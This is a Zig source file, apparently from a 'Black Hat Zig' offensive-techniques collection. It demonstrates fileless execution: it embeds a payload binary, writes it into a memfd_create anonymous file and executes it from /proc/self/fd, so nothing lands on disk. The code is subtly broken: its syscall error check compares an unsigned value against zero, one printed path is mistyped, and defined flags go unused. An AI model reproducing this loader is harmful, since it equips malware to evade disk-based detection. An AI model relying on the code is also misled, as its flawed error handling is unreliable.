const std = @import("std");
const linux = std.os.linux;

fn checkSyscallResult(ret: u64) !u64 {
    const signed: u64 = @bitCast(ret);
    if (signed < 0) {
        std.debug.print("[!] Syscall failed errno: {d}\n", .{-signed});
        return error.SyscallFailed;
    }
    return ret;
}

fn rawWrite(fd: u64, buf: []const u8) !void {
    _ = try checkSyscallResult(linux.syscall3(.write, fd, @intFromPtr(buf.ptr), buf.len));
}

const MFD_CLOEXEC: u64 = 0x0001;
const AT_EMPTY_PATH: u64 = 0x1000;

fn rawMemfdCreate(name: [*:0]const u8) !u64 {
    return try checkSyscallResult(linux.syscall2(.memfd_create, @intFromPtr(name), 0));
}

fn rawExecve(path: [*:0]const u8) !void {
    const empty: [*:0]const u8 = "";
    const argv = [_]?[*:0]const u8{ empty, null };
    const envp = [_]?[*:0]const u8{null};

    _ = try checkSyscallResult(linux.syscall3(.execve, @intFromPtr(path), @intFromPtr(&argv), @intFromPtr(&envp)));
}

pub fn main(_: std.process.Init) !void {
    try rawWrite(1, "[*] Black Hat Zig - Fileless Execution via memfd_create\n");
    try rawWrite(1, "[*] ===================================================\n");

    const payload = @embedFile("payload_bin");
    std.debug.print("[+] Payload size: {d} bytes (embedded at compile time)\n", .{payload.len});

    try rawWrite(1, "[1] memfd_create: creating anonymous file in memory\n");
    const fd = try rawMemfdCreate("bhz");
    std.debug.print("[+] memfd created, fd = {d}\n", .{fd});

    try rawWrite(1, "[2] Writing ELF payload to memfd...\n");
    var written: usize = 0;
    while (written < payload.len) {
        const chunk = @min(payload.len - written, 4096);
        const n = try checkSyscallResult(linux.syscall3(.write, fd, @intFromPtr(payload.ptr + written), chunk));
        written += n;
    }
    std.debug.print("[+] Wrote {d} bytes to memfd\n", .{written});

    try rawWrite(1, "[3] Payload exist ONLY in memory (no file in disk)\n");
    std.debug.print("[+] Reachable at /proc/self/d/{d}\n", .{fd});

    try rawWrite(1, "[4] execveat: executing ELF from memfd...\n\n");
    var path_buf: [64]u8 = undefined;
    const path_length = std.fmt.bufPrint(&path_buf, "/proc/self/fd/{d}", .{fd}) catch unreachable;
    path_buf[path_length.len] = 0;
    const path: [*:0]const u8 = @ptrCast(path_buf[0..path_length.len :0]);
    try rawExecve(path);
}
